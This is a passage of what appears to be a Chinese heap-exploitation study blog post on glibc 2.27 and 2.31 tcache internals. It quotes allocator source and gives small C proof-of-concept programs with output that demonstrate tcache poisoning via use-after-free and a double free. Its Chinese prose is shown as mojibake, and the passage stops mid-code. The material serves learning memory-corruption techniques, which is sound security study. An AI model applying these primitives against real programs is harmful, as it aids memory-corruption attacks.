<p>æ˜¾ç„¶æ¯ä¸ªæ¡¶å­é‡Œé¢çš„<code>chunk</code>å¤§å°ä¸ä¸€æ ·,å¹¶ä¸”å’Œæ¡¶å­ä¸‹æ ‡<code>idx</code>æœ‰æ˜ å°„å…³ç³»,å…·ä½“æ¥è¯´æ˜¯:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chunk size convert to tcache index:</span><br><span class="line">csize2tidx(csize) = (csize<span class="number">-0x11</span>) &gt;&gt; <span class="number">4</span> </span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>tcacheä¸‹æ ‡</th>
<th>chunk_size</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>0x20</td>
</tr>
<tr>
<td>1</td>
<td>0x30</td>
</tr>
<tr>
<td>2</td>
<td>0x40</td>
</tr>
<tr>
<td>â€¦</td>
<td></td>
</tr>
</tbody></table>
<blockquote>
<p>åœ¨<code>amd64</code>ä¸Š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SIZE_SZ = <span class="number">0x8</span></span><br><span class="line">MALLOC_ALIGNMENT = <span class="number">0x10</span></span><br><span class="line">MINSIZE = <span class="number">0x20</span></span><br><span class="line">MIN_CHUNK_SIZE = <span class="number">0x20</span></span><br><span class="line">MALLOC_ALIGN_MASK = <span class="number">0xf</span></span><br></pre></td></tr></table></figure>
</blockquote>
<h4 id="algorithm"><a href="#algorithm" class="headerlink" title="algorithm"></a>algorithm</h4><h5 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h5><p><code>glibc </code>åœ¨<code>2.26</code>ä¹‹å, å¼•å…¥äº†<code>TCACHE</code>æœºåˆ¶</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">malloc =&gt; __libc_malloc</span><br><span class="line">	tcache_get</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *</span><br><span class="line">__libc_malloc(<span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">    mstate ar_ptr;</span><br><span class="line">    <span class="type">void</span> *victim;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">    <span class="comment">/* int_free also calls request2size, be careful to not pad twice.  */</span></span><br><span class="line">    <span class="type">size_t</span> tbytes;</span><br><span class="line">    checked_request2size(bytes, tbytes);</span><br><span class="line">    <span class="type">size_t</span> tc_idx = csize2tidx(tbytes);		<span class="comment">//è®¡ç®—tcacheæ¡¶ä¸‹æ ‡</span></span><br><span class="line"></span><br><span class="line">    MAYBE_INIT_TCACHE();</span><br><span class="line"></span><br><span class="line">    DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">    <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins			<span class="comment">//ä¸‹æ ‡æœ€é«˜æ˜¯TCACHE_MAX_BINS = 64</span></span><br><span class="line">        <span class="comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="comment">/* to appease gcc */</span></span><br><span class="line">        &amp;&amp; tcache &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>)	<span class="comment">//tc_idxä¸‹æ ‡æ¡¶å­é‡Œè‡³å°‘æœ‰ä¸€ä¸ªå †å—</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> tcache_get(tc_idx);	<span class="comment">//ä»æ¡¶å­é‡Œæ‹¿ä¸€ä¸ªå †å—è¿”å›</span></span><br><span class="line">    &#125;</span><br><span class="line">    DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p>æ²¡æœ‰ä»»ä½•åµŒå¥—, é›¶å¸§èµ·æ‰‹</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get</span> <span class="params">(<span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];		<span class="comment">//FIFOæ ˆ</span></span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);				<span class="comment">//å†ç¡®ä¿ä¸€ä¸‹æ²¡æœ‰è¶Šç•Œ</span></span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);				<span class="comment">//å†ç¡®ä¿ä¸€ä¸‹è‡³å°‘æœ‰ä¸€ä¸ªå †å—</span></span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;				<span class="comment">//ä¸‹ä¸€ä¸ªå—æˆä¸ºå¤´å—</span></span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);						<span class="comment">//å—è®¡æ•°-1</span></span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span> *) e;								<span class="comment">//è¿”å›å †å—</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ•´ä¸ªè¿‡ç¨‹ä¸­<code>tcache-&gt;counts[tc_idx]</code>åªæ˜¯éšæ‰‹ä¸€è®°å½•,å¹¶æ²¡æœ‰æ ¹æ®å…¶å€¼åˆ¤æ–­æ˜¯å¦è¿˜æœ‰å †å—</p>
<p>çœŸæ­£çš„åˆ¤æ–­æ˜¯æ ¹æ®æ¡¶å­å¤´æŒ‡é’ˆæ˜¯å¦ä¸ºç©ºå†³å®šçš„</p>
<p>å½“ä¸€ä¸ªå †å—è¿”å›åˆ°<code>tcache</code>ä¸­æ—¶, å¦‚æœå¯ä»¥<code>UAF</code>, é‚£ä¹ˆå°±å¯ä»¥æŠŠä»»æ„å‡çš„å †å—å¡è¿›å»</p>
<p>å†™ä¸ªpocæ„æ€ä¸€ä¸‹</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">size_t</span> *chunk1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="type">size_t</span> *fake_chunk1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="type">size_t</span> *fake_chunk2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="type">size_t</span> *chunk2;</span><br><span class="line">    <span class="type">size_t</span> *chunk3;</span><br><span class="line">    <span class="type">size_t</span> *chunk4;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line">    chunk1[<span class="number">0</span>] = fake_chunk1;        <span class="comment">//UAF , chunk1 link fake_chunk1 into tcache</span></span><br><span class="line">    fake_chunk1[<span class="number">0</span>] = fake_chunk2;   <span class="comment">//fake_chunk1 link fake_chunk2 into tcache</span></span><br><span class="line"></span><br><span class="line">    chunk2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);          <span class="comment">//previous chunk1</span></span><br><span class="line">    chunk3 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);          <span class="comment">//previous fake_chunk1</span></span><br><span class="line">    chunk4 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);          <span class="comment">//previous fake_chunk2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fake_chunk1: %p\n&quot;</span>, fake_chunk1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fake_chunk2: %p\n&quot;</span>, fake_chunk2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk2: %p\n&quot;</span>, chunk2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk3: %p\n&quot;</span>, chunk3);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk4: %p\n&quot;</span>, chunk4);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/test<span class="meta"># gcc 227.c -o 227 -no-pie -g -O0 -w</span></span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/test# ./<span class="number">227</span></span><br><span class="line">fake_chunk1: <span class="number">0x24dd280</span></span><br><span class="line">fake_chunk2: <span class="number">0x24dd2a0</span></span><br><span class="line">chunk2: <span class="number">0x24dd260</span></span><br><span class="line">chunk3: <span class="number">0x24dd280</span></span><br><span class="line">chunk4: <span class="number">0x24dd2a0</span></span><br></pre></td></tr></table></figure>



<p>å¹¶ä¸”è°ƒè¯•è§‚å¯Ÿå½“<code>chunk2 = malloc(0x10);</code>ä¹‹å<code>tcache-&gt;count[tc_idx] = 0</code></p>
<p>æ¥ç€å½“<code>chunk3 = malloc(0x10);</code>ä¹‹å,<code>tcache-&gt;count[tc_idx] = 255 </code>,å‘ç”Ÿäº†æ•´æ•°ä¸‹æº¢</p>
<p>åªèƒ½è¯´<code>glibc-2.27</code>ä¸Šçš„<code>tcache</code>æ˜¯å¾ˆç®€é™‹çš„</p>
<h5 id="free"><a href="#free" class="headerlink" title="free"></a>free</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">free =&gt; __libc_free</span><br><span class="line">	_int_free</span><br><span class="line">		tcache_put</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">_int_free(mstate av, mchunkptr p, <span class="type">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">    INTERNAL_SIZE_T size;     <span class="comment">/* its size */</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    size = chunksize(p);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">size_t</span> tc_idx = csize2tidx(size);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">        &#123;	<span class="comment">//æ”¾å›å †å—åˆ°tcacheæ—¶æ ¹æ®countså†³å®šå¯¹åº”æ¡¶æ˜¯å¦å·²ç»å­˜æ»¡</span></span><br><span class="line">            tcache_put(p, tc_idx);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p><code>tcache-&gt;counts[tc_idx]</code>ç»ˆäºå‘æŒ¥ä½œç”¨äº†,åŸæ¥æ˜¯ä¸æƒ³éå†é“¾è¡¨ç»Ÿè®¡å †å—ä¸ªæ•°,ç›´æ¥çœ‹<code>counts</code>å·æ‡’</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>free</code>æ—¶æ ¹æœ¬æ²¡æœ‰æ£€æŸ¥, ç”šè‡³åç›®ä»—èƒ†çš„<code>double free</code>éƒ½æ²¡äº‹, å†™ä¸ª<code>poc</code>æ„æ€æ„æ€</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> * chunk = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">free</span>(chunk);</span><br><span class="line">    <span class="built_in">free</span>(chunk);<span class="comment">//å°±æ˜¯æ˜ç›®å¼ èƒ†double free</span></span><br><span class="line">    <span class="type">char</span> *chunk1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);    </span><br><span class="line">    <span class="type">char</span> *chunk2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk1 @ %p\n&quot;</span>,chunk1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk2 @ %p\n&quot;</span>,chunk2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/test<span class="meta"># ldd 227_df</span></span><br><span class="line">        linux-vdso.so<span class="number">.1</span> (<span class="number">0x00007fff22cdd000</span>)</span><br><span class="line">        libc.so<span class="number">.6</span> =&gt; /home/dustball/glibc/glibc<span class="number">-2.27</span>/lib/libc.so<span class="number">.6</span> (<span class="number">0x00007f9b9aab4000</span>)</span><br><span class="line">        /home/dustball/glibc/glibc<span class="number">-2.27</span>/lib/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span> =&gt; /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span> (<span class="number">0x00007f9b9ae68000</span>)</span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/test# ./<span class="number">227</span>_df</span><br><span class="line">chunk1 @ <span class="number">0xf6d260</span></span><br><span class="line">chunk2 @ <span class="number">0xf6d260</span></span><br></pre></td></tr></table></figure>



<h3 id="glibc-2-31"><a href="#glibc-2-31" class="headerlink" title="glibc-2.31"></a>glibc-2.31</h3><h4 id="datastructure-1"><a href="#datastructure-1" class="headerlink" title="datastructure"></a>datastructure</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span>			<span class="comment">//å¦‚æœkeyç­‰äºglibcæ—¢å®škeyå€¼è¯´æ˜æœ¬å †å—æ˜¯å·²ç»è¢«é‡Šæ”¾çš„</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint16_t</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">    tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure>

<p><code>glibc-2.29</code>ä¹‹å, <code>tcache_entry</code>ç»“æ„ä¸­åŠ å…¥äº†ä¸€ä¸ªkeyå­—æ®µ, å½“ä½¿ç”¨<code>tcache_put</code>æŠŠå †å—æŒ‚åˆ°<code>tcache</code>ä¸­æ—¶, å…¶<code>key</code>å­—æ®µå‡è¢«è®¾ç½®ä¸º<code>tcache</code>çš„åœ°å€</p>
<p>ä»¥<code>glibc-2.31</code>ä¸ºä¾‹</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache;</span><br><span class="line"></span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="algorithm-1"><a href="#algorithm-1" class="headerlink" title="algorithm"></a>algorithm</h4><h5 id="malloc-1"><a href="#malloc-1" class="headerlink" title="malloc"></a>malloc</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">malloc</span> =&gt; __libc_malloc</span><br><span class="line">	tcache_get</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *</span><br><span class="line">__libc_malloc(<span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">    mstate ar_ptr;</span><br><span class="line">    <span class="type">void</span> *victim;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">    <span class="comment">/* int_free also calls request2size, be careful to not pad twice.  */</span></span><br><span class="line">    <span class="type">size_t</span> tbytes;</span><br><span class="line">    <span class="keyword">if</span> (!checked_request2size(bytes, &amp;tbytes))</span><br><span class="line">    &#123;</span><br><span class="line">        __set_errno(ENOMEM);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">size_t</span> tc_idx = csize2tidx(tbytes);</span><br><span class="line"></span><br><span class="line">    MAYBE_INIT_TCACHE();</span><br><span class="line"></span><br><span class="line">    DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">    <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins &amp;&amp; tcache &amp;&amp; tcache-&gt;counts[tc_idx] &gt; <span class="number">0</span>)<span class="comment">//é€šè¿‡countsæ£€æŸ¥æ˜¯å¦æœ‰å‰©ä½™å †å—,è€Œä¸æ˜¯é€šè¿‡é“¾è¡¨æ˜¯å¦æŒ‡å‘ç©º</span></span><br><span class="line">    &#123;		</span><br><span class="line">        <span class="keyword">return</span> tcache_get(tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">    DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p>ä¸glibc-2.27ä¸­åŒºåˆ«çš„ä¸€ç‚¹æ˜¯, 2.31ä¸­åˆ¤æ–­idxå¯¹åº”æ¡¶å­ä¸­æ˜¯å¦æœ‰å †å—, ä¾æ®æ˜¯<code>tcache-&gt;counts[tc_idx] &gt; 0</code>,  ä¸å†çœ‹<code>entries</code>æ˜¯å¦ä¸ºç©º</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *</span><br><span class="line">__libc_malloc(<span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">    mstate ar_ptr;</span><br><span class="line">    <span class="type">void</span> *victim;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="comment">// malloc_hook</span></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">    <span class="comment">/* int_free also calls request2size, be careful to not pad twice.  */</span></span><br><span class="line">    <span class="type">size_t</span> tbytes;</span><br><span class="line">    <span class="keyword">if</span> (!checked_request2size(bytes, &amp;tbytes))</span><br><span class="line">    &#123;</span><br><span class="line">        __set_errno(ENOMEM);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">size_t</span> tc_idx = csize2tidx(tbytes);</span><br><span class="line"></span><br><span class="line">    MAYBE_INIT_TCACHE();</span><br><span class="line"></span><br><span class="line">    DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">    <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins &amp;&amp; tcache &amp;&amp; tcache-&gt;counts[tc_idx] &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> tcache_get(tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">    DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get</span> <span class="params">(<span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  e-&gt;key = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ³¨æ„åˆ°tcacheå †å—ä¸ä¼šæœ‰å¯¹é½æ£€æŸ¥</p>
<p>å †å—ä»tcacheä¸­æ‹¿å‡ºæ¥ä¹‹å‰ä¼šå°†keyå½’é›¶, é˜²æ­¢æ³„éœ²tcacheåœ°å€</p>
<h5 id="free-1"><a href="#free-1" class="headerlink" title="free"></a>free</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">free =&gt; __libc_free</span><br><span class="line">	_int_free</span><br><span class="line">		tcache_put</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">_int_free(mstate av, mchunkptr p, <span class="type">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">    INTERNAL_SIZE_T size;     <span class="comment">/* its size */</span></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    size = chunksize(p);</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">size_t</span> tc_idx = csize2tidx(size);</span><br><span class="line">        <span class="keyword">if</span> (tcache != <span class="literal">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">        &#123;</span><br><span class="line">            <span 